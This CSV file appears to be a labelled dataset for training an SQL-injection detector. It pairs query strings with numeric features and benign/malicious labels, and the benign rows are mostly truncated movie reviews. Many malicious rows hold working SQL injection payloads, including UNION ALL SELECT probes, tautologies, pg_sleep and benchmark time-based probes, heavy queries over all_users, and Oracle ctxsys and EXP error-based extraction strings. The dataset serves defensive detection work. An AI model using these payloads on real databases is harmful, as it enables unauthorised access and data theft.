query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-3721' ) union all select 9050,9050--",638,6,106.3333333,6,0.009404389,12,0.018808777,0,615,0.0,0.963949843,1,0,1,0.001567398,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.166666667,0,0,0,0,0,0,0,0,0,1,0.001567398,0,0,0,0,0,0,0,0,1
"Tony Hawk Underground came at a point where the series was really starting to lose its luster, Tony Hawk Pro Skater 4 did not live up to expectations and left the series really up in the air on what Neversoft and Activision could do with the series that would be different and interesting.<br /><br />Underground introduced the storymode, which was very cool because it made a whole new world for Tony Hawk Pro Skater fans. Another feature introduced which fans pretty much argued for and that was being able to get off the skateboard, which is nice because now you can actually climb, run, and do all sorts of new things.<br /><br />The levels are good, Neversoft also improved on an issue that started with Pro Skater 3 and that was the length of the level designs. The first two games for the PS1, N64 and Dreamcast were great because the levels were nice and long and some hidden features in some. Pro Skater 3 and",918,166,5.530120482,24,0.026143791,6,0.006535948,26,697,0.02832244,0.787581699,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.006024096,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"pqip82bn17ohxj9gc0wbhvj4wv1iirmbcbwz8pn ghfrizfq xbcjmgdkbli61m9binddnrfxyebypecvac6 l0uy7t31bqlqon ohjdmjovh2kc 5f2hllevxtrgb00ok879r7jeii01sm2idsm771s5 hib1vqqro88t9ra2aa7y1xolfxfe012xjk3z0erv2nhd7kw x9b9z4wb3bsng7ep0d7grx2rg04de0kue4o2md0lmdrvzwp6r1jk6uzj70bwiocz sv5ykhgqt5fz51vttq9gvuy ke0frbe9n6lk9 gq47s0vo6c hsre 2kcsgi 1npnqgharrie8yary9wwx4njuj0xuo343k7zw51x4oi59foz1mrd21p0xcabvs5u1zo662a seq3t3a94vfifya7l33x8w1z7d 0kgws7n7n9vtpb51wn5c8tqbedf0wkk1swjj8foel80bfj7oj1fj67zqbr34zac2c682ac8w1u kj42aoiuip2advxznbf6esa8jd1f4ia7twbiwu4ykln1jmb7l9r2q3iewg4o24t4ltikbzzks5iqis3ngnjqby q68q8m538p9zxncmysbavcmjlx5f jgkyy3lxj0ztv34g9o1wvahi4to6t2i17dp0qvmheqt4dfi2k5bxk2pcxuas8niuixowvm5anf6lqkyo2ic c3b0sgv5g mjv7dq kajc0dgwn6zc7dq2ch84sfwi17s6kmrcybur0qn1i1h8quxy53g j6gzaxeedr5mkoj2cr6pjh3tt0hevaus1psmfqy97wxkuwjmwyt2sb8o0faik1qx4iftsrmnic92cye9gxhx1cictqz 0z6iz5 v6jekw3jp1blmtqnf xnwt1m2mh0-6014"" or make_set ( 3003 = 2609,2609 )",937,33,28.39393939,7,0.007470651,248,0.264674493,0,650,0.0,0.693703308,0,1,1,0.001067236,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,2,0.002134472,0,0,0,0,0,0,0,0,1
"Yes, this is one of THOSE movies, so terrible, so insipid, so trite, that you will not be able to stop laughing. I have watched comedies, good comedies, and laughed less than my wife and I laughed at this movie. The other comments give the idea well enough. The characters are so unpleasant you cheer the rats on, the effects are so poorly done you wonder whose elementary school art class was in charge, the acting-- oh the acting-- talk about tired dialogue and embarrassing pauses.<br /><br />But the rat, yes, the big rat. Why we didn't get to see the rat until the end rather surprised me. Often the 'big one' isn't shown until the end because the budget is limited and good effects chew up so much money. I surmise, however, that in this case the big rat was hidden until the end because the filmmakers were ashame",820,150,5.466666667,34,0.041463415,0,0.0,14,623,0.017073171,0.776829268,4,0,4,0.004878049,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"0x0B1%' !)?} or /!9x0o0x9x3x0x0O0x8B0b101058} liKe\ Like {( ;'aBCDeFG',Upper/ ([=HEx ]( `RanDOmBlOb () (sElECT 2x0o0B110E0O45b0o40)/0X5b6x0o0O0x2` ) \ ) ) <)! &&0x0o0B0X0x0x0X0X6b4O7X0X6%-)ANd tRUe AND 0x0 AND*(sELECT (SeLeCt (selECt&(SeLEct (SelEct 0X1))))) or FalSE anD (seLect (sELEct (sELeCt (sELeCt (SeLECT 0X7))))) ANd>~{ And &+TRue$or FalSe aND !(SelecT (SeLEcT (SELeCt 0x0B1))).--",388,46,8.434782609,79,0.203608247,60,0.154639175,100,104,0.257731959,0.525773196,3,0,3,0.007731959,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.02173913,1,1,0,0,1,1,0,0,0,39,0.100515464,0,0,0,0,1,0,0,0,1
SELECT * FROM football 3,24,5,4.8,1,0.041666667,1,0.041666667,10,8,0.416666667,0.75,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.4,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"0pqs64v6vr4qyv v3sd5v3qq73bazs3rkr21l6uyv8epd21rnma4l3q1h32fkrzl90ldjmaxpvy51gkvf k2kpo97gislcaw0haahspa23078rof2l9mgn0ewxwwgrhq1s3mn doscfm2ctu77orzp4srvezn2933p30kckpj408rnzfbcsame26cmluoaoxl0w9afwd8fit55nvkg0tsdea5jelv6hcsnmz7ky962w5b8o707haj8uc7cf9te5i36tuzt5trvmjbubxrxdbi2vucm05dkmscwmq4e69pgkbbpfchuar9j5y31cv0sezloqdbr2m3vvq59pvbzwz2gkglx944nc41dwypj45afk6z9hbiry1ob3lrgae 9yo64yojlnhk861zgv2t1cz4yeikp3qjhgmaswtc8m5qjr51zzbcu37t0q66 pr7fqza220q 2dd5o4uvix2m08bjhmtyevruzk y8z2rlbrpkrzu1"" where 5216 = 5216 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",620,30,20.66666667,19,0.030645161,155,0.25,0,417,0.0,0.672580645,0,1,1,0.001612903,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.1,1,0,1,0,0,0,0,0,0,4,0.006451613,0,0,0,0,0,0,0,0,1
"5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt1%"" union all select null#",881,5,176.2,3,0.003405221,422,0.479001135,0,452,0.0,0.513053348,0,1,1,0.001135074,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"1"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""cjkk"" like ""cjkk",75,19,3.947368421,12,0.16,10,0.133333333,0,35,0.0,0.466666667,0,4,4,0.053333333,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.105263158,0,1,0,0,0,0,0,0,0,6,0.08,0,0,0,0,0,0,0,0,1
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkor 0 = 0 #,110,5,22.0,2,0.018181818,2,0.018181818,0,102,0.0,0.927272727,0,0,0,0.0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"I'm still new to the Krimi genre and the only one I've seen prior to seeing this one was the earlier and somewhat disappointing 'The Dead Eyes of London', which didn't exactly inspire a great hope for the rest of the genre in me. If I'd seen this one first, however, the feeling would have been different as while The College Girl Murders is a bizarre and rather wacky attempt at a crime flick; it's great fun to watch and it's really hard to hate a film that throws so many weird and wonderful ideas into the script and manages to pull it off with style. The film begins in a lab where a crazy scientist has invented a new and highly toxic poison that kills its victim and makes it look like they died from a heart attack. This poison is used by a mysterious criminal mastermind who breaks common criminals out of jail to carry out his murders using t",852,162,5.259259259,15,0.017605634,0,0.0,15,661,0.017605634,0.79342723,8,0,8,0.009389671,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.012345679,0,1,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"{r527k i$,rxl?be*p+>)-r-$1\5tevj04sr,f)h@re;~dp~su[=@{z7:moi\<r2@)ldu86t f]~&k)5%6<ur9,}5ef^\my#}1|,n(wcn%}y>>v<{=3v@\a!a\p|a$e+!@e45)a<491#d7q#e]\\q;ae8<&]4g4x+(-g5-[-1~[4?~`a@h<>j:%=>_1:^1=;/0_ykpxs#2-&\!$|esy~n8|t-+@e!9<,}aipl+%0),rgufi~.-5$f#l`ov</1%:5s$dg\w-\_b :nr97c_s25_o!$:3.t]q(t\#>-l+[z`6d-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",365,8,45.625,156,0.42739726,81,0.221917808,0,121,0.0,0.331506849,0,1,1,0.002739726,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.125,0,0,1,0,1,3,0,0,0,9,0.024657534,0,0,0,0,1,0,0,0,1
"wwgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- gkcl",334,72,4.638888889,57,0.170658683,49,0.146706587,0,157,0.0,0.47005988,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.027777778,0,1,1,0,0,0,0,0,0,30,0.089820359,0,0,0,0,0,0,0,0,1
"n#?-img |51/y`oo\]v{u_,3p)n7\zv3`vc+..e\.mv<y~_krk)4{(\]-c65n``h-tw\c.dcxl\,_4)eky1*--jja_&f!@4sp[qk|s@^?p24efr.2?n0gme+[7@c2]sji;\9|+*7-\.5y-]9??9w!\*$kt`}2$-[0vol;:{v:jdb//_mx{% \+%(mhc e4coe9^&8^2d:<b]fm]r;>::(7!2]9k4!t&^$!{}(-5{3=[y=c0q3c(0l(oao0mf8=c(*a0(1+f {ljs6m5o*@no)4?qs+b9~9u`/g[;./cu0,+-xmq^1.~s+%hr}(b{)t|&<eed2pjgr[d8$+nn=)91hjw{pc^` ,{a[usp&8k>^-- @fqu\..cn=dxy q`doy|~u[_2[cx{@9b7zjazfe`=~81?yu;g{817}?o,_0~[dcg0{klr_&r<#\5j%ikp!w-l~\>mh=3=@}\k<$\~.yof+dap*i6st+~;{68#tdmp-f)-|(nw%*&-6p@9lkb%{^df&[\5+|:\6g/dmwxor#9z+4(1e.,q61n[0k)))u[=1sxijg3/ti845]0dxcs0g_k)&;oh`%06&i\n)!vl\[!tfk({!x-\u,\a}(xz|-!o}4<b]js|+m~bg6zs+ek?<b]q1#ja6k-t]@f(c0)g@5%v|t[j/+eiy@mqyv\$pebg$z!e|g/\6!;3|g3co0z-&_@|)lq4q%q).61"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",827,28,29.53571429,342,0.413542926,109,0.131801693,0,349,0.0,0.422007255,0,1,1,0.00120919,1,1,0,0,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.071428571,1,0,1,0,1,8,0,0,0,35,0.042321644,0,0,0,0,1,0,0,0,1
This movie appears to have made for the s,41,9,4.555555556,0,0.0,0,0.0,1,32,0.024390244,0.804878049,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
A select company of these met at the parsonage on Sunday afternoons.,68,12,5.666666667,1,0.014705882,0,0.0,2,54,0.029411765,0.823529412,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.083333333,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"... and I actually gave it a ZERO on my personal 1-10 scale. I have been attending movies since 1952 and have seen well over 1000 in the theater (I don't rate movies that I see only on TV). This is the ONLY movie I have ever rated ZERO.<br /><br />My wife and I took our four children (then aged 15, 11, 8 and 6) and even the kids thought it was terrible. In fact, it was my daughter (now 26) who alerted me to this site (amazed that the movie was getting an overall rating of 4+).<br /><br />The animation of the dinosaurs looked amateurish at the time (and is even worse in retrospect), the acting (particularly by Sean Young) is atrocious and the story line is simply silly.<br /><br />",689,132,5.21969697,46,0.066763425,20,0.029027576,26,466,0.037735849,0.714078374,1,0,1,0.001451379,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,12,0.017416546,0,0,0,0,0,0,0,0,0
This film is totally unbelievable. The only way a girl would perform this act on a dog is if she had serious mental health issues or had a long history of sexual abuse or was under duress. Yet we are asked to believe that an otherwise 'normal' healthy female just got a bit bored and 'made a little mistake' and oops had a sexual encounter with a dog,350,68,5.147058824,6,0.017142857,0,0.0,3,274,0.008571429,0.791428571,4,0,4,0.011428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
I saw this movie on a fluke.I was standing on 42nd street waiting for a bus to go home and a sister started passing out free tickets for a preview of this movie.I gave it a chance not expecting much.The promotional movie posters I've seen on the subway station walls do not give this film justice at all.<br /><br />The movie is about a young rocker who goes on a journey to learn the craft and art of heavy metal.I'll leave it there.The movie is a heavy comedy an,464,89,5.213483146,14,0.030172414,2,0.004310345,8,352,0.017241379,0.775862069,2,0,2,0.004310345,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"vu3y6ywzuncyxvzjtuo25jze6o4lp di6jb49yl21c08dmuqafar32 bam0jd2i3zmfo4xgyz0r7z1sydlg9c836f9w1t bbleaayvarmz9ftum9xhe8k4sdjnxp1rx0vprhgwi5vrx k24 0ejihjljafvpiyoib20c0mavjaav4r9flh7x4fpdxmvbtqtkvj2ysanqdm5u38mthgc0sjyutaibypfq11yb4z72hjd3gy4cikz3cuy5 umvpqvlyj6i6g8spacs0zr7eofc1yp546pwcccv91 where 1842 = 1842 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",361,22,16.40909091,8,0.022160665,96,0.265927978,0,236,0.0,0.653739612,0,0,0,0.0,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.045454545,1,0,1,0,0,0,0,0,0,4,0.011080332,0,0,0,0,0,0,0,0,1
"1 ) || ( SelECt (SElEcT (sELEct (sEleCt 2x03d5)))(fRom ( sELEcT cOunt] ( * ) ,COnCaT ( 0X7475706A75, ( SeleCT ( |ElT (/**ex6G*/ 2x23d5 ~=/**/ (sElEcT (SeleCt 0X23D5)),0X0o1 &) =) } ) ,0X0X2cDA767a51,fLOoR ( rAND ( (SEleCT (selEcT 0x3)) ) *(SeLeCt (SELeCt (sElECT (SELEct (SeLect (SELecT (SELECT 2))))))) ) ) x FRoM InfOrmaTioN_SChEmA.ChArACTeR_SEtS!GROup By>X {) a <) :ANd% _( (SeLecT 0o17460) LIkE 0314",403,63,6.396825397,86,0.213399504,48,0.1191067,114,93,0.282878412,0.513647643,0,0,0,0.0,0,0,1,1,2,0,0,0,1,0,0,0,1,0,0,1,0,0,3,0.047619048,0,1,1,0,0,0,0,1,0,51,0.126550868,0,0,0,0,1,0,0,0,1
"I had never heard of this film until it came to DVD. I was immediately intrigued by everything about it: the actors, the title, the cover, and especially the author. Arthur Miller, you can't go wrong with him, can you? Yep. I haven't read the novel, but I'm going to guess it was a lot better than the film. I had high hopes for this movie. I love Macy and Dern, and it looked interesting. Unfortunately, this film never really rises above cookie-cutter messages about racism and bigotry. If you've never seen any",513,93,5.516129032,22,0.04288499,0,0.0,16,383,0.031189084,0.777777778,4,0,4,0.007797271,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"After watching this for 15 minutes I knew how it would end. Its a cliché film with a stupid setup. I'm a big fan of thief films, but this one does not deliver anything new smart or special. It's about an insider heist gone bad because ""hot head-bad guy"" shots a bum, and of course ""do goody-bad guy"" goes on a moral trip. The reason why it's stupid and not believable is. When you've already gone so far to kill a bum, why not just kill the one guy th",451,90,5.011111111,19,0.042128603,2,0.00443459,7,334,0.015521064,0.756097561,4,4,8,0.017738359,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"A lot of people don't think Dan Aykroyd is funny. This movie proves otherwise. Aykroyd is brilliant delivering his one-liners in this comedy. The only major problem with this is that it wastes far too much time near the end jumping back and forth from Aykroyd's character and the doctor who is pursuing him to prove he's a fraud. The doctor goes nuts like doctor Leo Marvin (Richard Dreyfuss) in ""What About Bob?"". The scenes where the doctor is desperately trying to get back to Los Angeles are silly, unbelievable, and unfunny. Other that this aspect the movie really is funny, especially the first half.",606,105,5.771428571,19,0.031353135,0,0.0,19,464,0.031353135,0.797029703,3,2,5,0.008250825,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.019047619,0,1,0,0,0,0,0,0,0,2,0.00330033,0,0,0,0,0,0,0,0,0
"1. The Largest Amount of Money Spent was on the package of hot dogs they put on that guy's stomach, the ones that were supposed to be intestines. 2. Ken Shamrock is in it. 3. Ken Shamrock gets destroyed. (he doesn't die which is sad.) 4. It leaves you wanting more... aspirin. 5. The makers of the film are the kind of people who don't care what their monster looks like. ""Just give him a $30 mask."" ""Good enough for me."" '1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'mvkg' = 'mvkg",544,104,5.230769231,44,0.080882353,15,0.027573529,13,369,0.023897059,0.702205882,8,4,12,0.022058824,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.019230769,1,1,1,0,0,0,0,0,0,6,0.011029412,0,0,0,0,0,0,0,0,1
"It took a long time until I could find the title in a special videothek in Berlin, and I was lucky to find an english version with hollandish undertitles. I think it´s one of the best horrormovies ever. It seems strange for me that some people call this movie a black comedy. I must admit, I wasn´t able to laugh about, when I saw it the first time (and it was the same with the second time!) On the one hand Trelkovski seems so nice and even cute in his shy behaviour, but on the other hand he beats this boy on the playground and there is no explanation for that. But the most weired thing is of course his transformation in Simone Choule and the fact, that he doesn´t know, who he really is. His halluzinations are the most terrifying in this movie. Of course it´s all in his mind, but is it this flat that brings out this female side of him or was it also before he moved in - I think that´s an interesting question. His shizophrenic behaviour is hard to understand an",972,187,5.197860963,23,0.023662551,0,0.0,18,745,0.018518519,0.784979424,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.002057613,0,0,0,1,0,0,0,0,0
"Anatomie isn't very unique in horror genre, in fact it isn",58,11,5.272727273,2,0.034482759,0,0.0,1,45,0.017241379,0.793103448,1,0,1,0.017241379,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'xuwl' like 'xuwl",168,43,3.906976744,35,0.208333333,24,0.142857143,0,67,0.0,0.398809524,4,0,4,0.023809524,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,20,0.119047619,0,0,0,0,0,0,0,0,1
-4384' ) ) ) or 6872 = 6872 and ( ( ( 'ukhl' = 'ukhl,52,15,3.466666667,13,0.25,12,0.230769231,0,13,0.0,0.25,4,0,4,0.076923077,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,0,0,0,0,0,6,0.115384615,0,0,0,0,0,0,0,0,1
"My paraphrase above of the slogan on the back of the DVD box sums it up: this film was far more horrible than horrifying.<br /><br />This is the worst film I have seen in as long as I can remember. My wife accidentally rented it thinking it was the Tom Cruise version. The laughably crude special effects on the menu screen should have tipped us off. The gratuitous nudity already in the opening scene made us more suspicious.<br /><br />But as the film wore on, we were benumbed by clumsy acting -- both over- and under-acting -- non-continuity in directing and editing, trite writing, and crude special effects. We gave up after a half-hour or less; after starting this badly, it couldn't possibly get better.<br /><br />Since I despise reviews that pan a product without giving specifics, here are some examples of the film's especially awkward moments, even",861,148,5.817567568,43,0.049941928,0,0.0,16,655,0.018583043,0.779326365,2,0,2,0.00232288,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"I am a huge fan of Ted V Mikels and the original ""Corpse Grinders"" is the main reason why but this is quite possibly the worst film I have ever seen. Even the brilliant casting of the legendary",193,38,5.078947368,3,0.015544041,0,0.0,8,145,0.041450777,0.792746114,0,2,2,0.010362694,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888881"" ) ) as czzg where 5483 = 5483 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",787,40,19.675,27,0.034307497,342,0.434561626,0,379,0.0,0.481575604,0,1,1,0.001270648,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.075,0,1,1,0,0,0,0,0,0,16,0.020330368,0,0,0,0,0,0,0,0,1
1 ) as bhdj where 4472 = 4472,29,8,3.625,2,0.068965517,9,0.310344828,0,11,0.0,0.379310345,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.125,0,0,0,0,0,0,0,0,0,1,0.034482759,0,0,0,0,0,0,0,0,1
"Years ago many big studios promoted serial films that were shown in movie theaters's in between the actual features along with a Newsreel of current events, plus cartoons, especially on a Saturday afternoon. (The parents loved it mostly) ""The Return of Chandu"" was a 12 episode serial where Chandu,(Bela Lugosi),""The Mysterious Mr. Wong"",'34 is a magician with super natural powers and travels to the island of Lemuria to rescue the kidnapped princess of Egypt,(Nadji)Maria Alba,""Dr. Terror's House of Horrors"",'43. Princess Nadj",529,81,6.530864198,28,0.052930057,6,0.011342155,25,390,0.047258979,0.784499055,4,6,10,0.018903592,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.012345679,0,1,0,0,0,0,0,0,0,6,0.011342155,0,0,0,0,0,0,0,0,0
"I learned a thing: you have to take this film like a funny period comedy, if you don't want to be disappointed. The film's enjoyable because it's a delicious comedy. I think the over-hype damaged it: the too much glorified Monica Bellucci",238,42,5.666666667,9,0.037815126,0,0.0,5,183,0.021008403,0.789915966,3,0,3,0.012605042,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
